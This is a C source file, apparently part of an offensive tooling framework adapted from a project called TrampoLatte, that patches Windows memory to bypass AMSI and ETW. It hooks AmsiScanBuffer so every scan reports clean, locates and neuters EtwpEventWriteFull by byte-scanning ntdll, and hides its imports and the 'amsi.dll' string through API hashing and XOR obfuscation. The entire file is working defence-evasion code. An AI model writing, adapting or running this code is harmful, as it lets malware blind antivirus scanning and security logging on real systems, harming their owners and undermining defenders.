/*
 * trampoline.c
 *
 * AMSI & ETW bypass via x64 trampoline hooks.
 * Adapted from TrampoLatte (github.com/MochaByte/TrampoLatte).
 *
 * All WinAPI calls are resolved at runtime via API hashing so no
 * suspicious IAT entries appear in the binary.
 */

// #-DEBUG_DEFINE-#

#include <windows.h>
#include <stdint.h>
#include "functions.h"
#include "trampoline.h"

#ifdef DEBUG
#include <stdio.h>
#define DBG(fmt, ...) do { char _b[512]; sprintf(_b, "[TrampoLatte] " fmt "\n", ##__VA_ARGS__); OutputDebugStringA(_b); } while(0)
#else
#define DBG(fmt, ...) ((void)0)
#endif

#define TRAMPOLINE_SIZE 13

extern void RetStub(void);

typedef HANDLE HAMSICONTEXT;
typedef HANDLE HAMSISESSION;
#define AMSI_RESULT_CLEAN 0
typedef int    AMSI_RESULT;

typedef HRESULT (WINAPI *PFN_AMSI_SCAN_BUFFER)(
	HAMSICONTEXT, PVOID Buffer, ULONG Length,
	LPCWSTR ContentName, HAMSISESSION, AMSI_RESULT *Result);

static PFN_AMSI_SCAN_BUFFER g_pOriginalAmsiFunc = NULL;


BOOL GetEtwpEventWriteFull(OUT PVOID *ppFunction)
{
	// First getting a pointer to the EtwEventWriteEx function
	PBYTE pEtwEventWriteEx = (PBYTE)GetProcAddressH(
		GetModuleHandleH(#-NTDLL_VALUE-#),
		#-ETWEVENTWRITEEX_VALUE-#);
	if (pEtwEventWriteEx == NULL)
	{
		DBG("[-] Failed to get EtwEventWriteEx");
		return FALSE;
	}
	DBG("[+] Found EtwEventWriteEx at 0x%p", pEtwEventWriteEx);

	PVOID	pTargetFunction = NULL,
			pTemp = NULL;
	int i = 0;

	// 1. We start at the pointers address and go down the memory lane to find the C3 instruction

	while(1)
	{
		BYTE opcode = pEtwEventWriteEx[i];

		// 2. We have reached the RET instruction, stop there
		if (pEtwEventWriteEx[i] == 0xC3)
		{
			break;
		}
		i++;
	}

	// 3. By doing it this way, we ensure we hit the right 0xE8 instruction which is the CALL instruction.

	// 4. We loop again, this time we move "upwards" to hit the CALL instruction
	while (i)
	{
		BYTE opcode = pEtwEventWriteEx[i];

		// 5. We have reached the CALL instruction
		if (opcode == 0xE8)
		{
			// We get the relative address for EtwpEventWriteEx.
			// pEtwEventWriteEx + i -> this is the CALL instruction
			// + 1 gets you the first byte of the displacement
			// I used int32_t because its a 32-bit signed integer and negative displacements are handled correctly
			int32_t relative = *(int32_t*)(pEtwEventWriteEx + i + 1);
			DBG("relative addr: 0x%p", (PVOID)(uintptr_t)relative);

			// We go from pEtwEventWriteEx + i which is the CALL instruction. +5 gets you past that and + relative gets you the relative address of EtwpEventWriteFull.
			pTargetFunction = pEtwEventWriteEx + i + 5 + relative;
			DBG("pTargetFunction at position: 0x%p", pTargetFunction);

			// 6. pTargetFunction is now EtwpEventWriteFull
			*ppFunction = pTargetFunction;
			return TRUE;
		}

		i--;
	}

	return FALSE;
}


BOOL TrampolineX64(IN PVOID pHookedFunction, IN PVOID pDetourFunction, OUT PVOID *pOriginalFunc, OUT DWORD *dwOldProt)
{
	DWORD dwOldProtect = 0;

	// Trampoline x64
	uint8_t	uTrampoline[] = {
			0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, pFunctionToRun
			0x41, 0xFF, 0xE2                                            // jmp r10
	};

	// The actual patch
	uint64_t patch = (uint64_t)(pDetourFunction);

	// Prepare the jump point
	memcpy(&uTrampoline[2], &patch, sizeof(patch));

	DBG("TrampolineX64: target=0x%p detour=0x%p", pHookedFunction, pDetourFunction);

	// Dump the bytes we intend to write
	DBG("  Trampoline payload: %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
		uTrampoline[0], uTrampoline[1], uTrampoline[2], uTrampoline[3],
		uTrampoline[4], uTrampoline[5], uTrampoline[6], uTrampoline[7],
		uTrampoline[8], uTrampoline[9], uTrampoline[10], uTrampoline[11], uTrampoline[12]);

	// Dump the original bytes at the target before we touch anything
	{
		BYTE *p = (BYTE *)pHookedFunction;
		DBG("  BEFORE: %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
			p[0], p[1], p[2], p[3], p[4], p[5], p[6],
			p[7], p[8], p[9], p[10], p[11], p[12]);
	}

	// Saving the old function
	PVOID pTmp = VirtualAlloc(NULL, TRAMPOLINE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pTmp == NULL)
	{
		DBG("  VirtualAlloc failed for backup: %lu", GetLastError());
		return FALSE;
	}
	memcpy(pTmp, pHookedFunction, TRAMPOLINE_SIZE);
	*pOriginalFunc = pTmp;

	// Changing memory permissions for the function you want to hook
	if (!VirtualProtect(pHookedFunction, TRAMPOLINE_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect))
	{
		DBG("  VirtualProtect failed: %lu", GetLastError());
		return FALSE;
	}
	DBG("  VirtualProtect OK — old protection: 0x%lX (%lu)", dwOldProtect, dwOldProtect);

	// Write using volatile pointer to prevent compiler from optimizing the write away
	volatile BYTE *dst = (volatile BYTE *)pHookedFunction;
	for (int i = 0; i < TRAMPOLINE_SIZE; i++)
	{
		dst[i] = uTrampoline[i];
	}

	// Flush instruction cache so the CPU picks up the new bytes
	FlushInstructionCache((HANDLE)-1, pHookedFunction, TRAMPOLINE_SIZE);

	// Verify the write actually landed
	{
		BYTE *p = (BYTE *)pHookedFunction;
		DBG("  AFTER:  %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
			p[0], p[1], p[2], p[3], p[4], p[5], p[6],
			p[7], p[8], p[9], p[10], p[11], p[12]);

		if (p[0] != 0x49 || p[1] != 0xBA)
		{
			DBG("  !!! WRITE VERIFICATION FAILED — bytes unchanged. Trying WriteProcessMemory fallback...");
			SIZE_T written = 0;
			if (WriteProcessMemory((HANDLE)-1, pHookedFunction, uTrampoline, TRAMPOLINE_SIZE, &written))
			{
				DBG("  WriteProcessMemory OK — %llu bytes written", (unsigned long long)written);
				FlushInstructionCache((HANDLE)-1, pHookedFunction, TRAMPOLINE_SIZE);

				// Re-check
				if (p[0] != 0x49 || p[1] != 0xBA)
				{
					DBG("  !!! WriteProcessMemory also failed to stick. Page may be protected by CIG/ACG.");
					return FALSE;
				}
			}
			else
			{
				DBG("  WriteProcessMemory failed: %lu", GetLastError());
				return FALSE;
			}
		}
	}

	DBG("  Trampoline verified and set!");

	// Assigning values
	*dwOldProt = dwOldProtect;

	return TRUE;
}


BOOL RemoveTrampoline(IN PVOID pHookedFunc, IN PVOID pOriginalFunction, IN DWORD dwOldProtect)
{
	DWORD	dwNewProtect = 0,
			dwOldProtection = 0;

	// Setting the original function
	memcpy(pHookedFunc, pOriginalFunction, TRAMPOLINE_SIZE);

	// Restoring the old protetion values
	if (!VirtualProtect(pHookedFunc, TRAMPOLINE_SIZE, dwOldProtect, &dwNewProtect))
	{
		DBG("Failed to restore memory protection: %lu", GetLastError());
		return FALSE;
	}

	return TRUE;
}


// Function to just RET when a hooked function is called
VOID BlockExecutionFlow(PCONTEXT pCtx)
{
	// Altering execution flow by placing the instruction pointer to the RetStub
	pCtx->Rip = (ULONG_PTR)&RetStub;
}


HRESULT WINAPI ProxyAmsi(HAMSICONTEXT ctx, PVOID buf, ULONG len, LPCWSTR name, HAMSISESSION sess, AMSI_RESULT *pRes)
{
	// Changing the return value
	*pRes = AMSI_RESULT_CLEAN;
	// returning SUCCESS code
	return S_OK;
}


BOOL InstallTrampolines(BOOL bypassAmsi, BOOL bypassEtw)
{
	PVOID	pOriginalEtwFunc	= NULL,
			pEtwpEventWriteFull = NULL,
			pOriginalAmsiFunc	= NULL;

	DWORD	dwOldProtectAmsi	= 0,
			dwOldProtectEtw		= 0;

	if (bypassEtw) {
		HMODULE hNtdll = (HMODULE)GetModuleHandleH(#-NTDLL_VALUE-#);

		DBG("Fetching EtwpEventWriteFull..");

		/* 1. EtwpEventWriteFull -- private, found via byte scan (original TrampoLatte) */
		GetEtwpEventWriteFull(&pEtwpEventWriteFull);
		if (pEtwpEventWriteFull) {
			if (!TrampolineX64(pEtwpEventWriteFull, RetStub, &pOriginalEtwFunc, &dwOldProtectEtw))
			{
				DBG("Failed to trampoline EtwpEventWriteFull");
			}
			else
			{
				DBG("EtwpEventWriteFull is now hooked at 0x%p", pEtwpEventWriteFull);
				DBG("dwOldProtectEtw value: %lu", dwOldProtectEtw);
			}
		} else {
			DBG("Could not locate EtwpEventWriteFull, skipping");
		}

		DBG("ETW hooking phase complete");
	}

	if (bypassAmsi) {
		/* Force-load amsi.dll if not already present.
		 * String is built on the stack -- no static "amsi.dll" in the binary. */
		HMODULE hAmsi = (HMODULE)GetModuleHandleH(#-AMSI_VALUE-#);
		if (!hAmsi) {
			char amsi[] = { 'a'^0x5,'m'^0x5,'s'^0x5,'i'^0x5,
							'.'^0x5,'d'^0x5,'l'^0x5,'l'^0x5, 0 };
			for (int i = 0; amsi[i]; i++) amsi[i] ^= 0x5;
			hAmsi = LoadLibraryA(amsi);
		}
		if (!hAmsi) {
			DBG("Failed to load AMSI.DLL");
			return FALSE;
		}

		/* Resolve AmsiScanBuffer via API hashing -- no IAT entry */
		PVOID pAmsiScanBuff = (PVOID)GetProcAddressH(hAmsi, #-AMSISCANBUFFER_VALUE-#);
		if (pAmsiScanBuff == NULL) {
			DBG("Failed to get AmsiScanBuffer");
			return FALSE;
		}
		DBG("Found AmsiScanBuffer at 0x%p", pAmsiScanBuff);

		if (!TrampolineX64(pAmsiScanBuff, ProxyAmsi, (PVOID *)&g_pOriginalAmsiFunc, &dwOldProtectAmsi))
		{
			DBG("Failed to trampoline AmsiScanBuffer");
			return FALSE;
		}
		DBG("AmsiScanBuffer is now hooked");
		DBG("dwOldProtectAmsi value: %lu", dwOldProtectAmsi);
	}

	return TRUE;
}
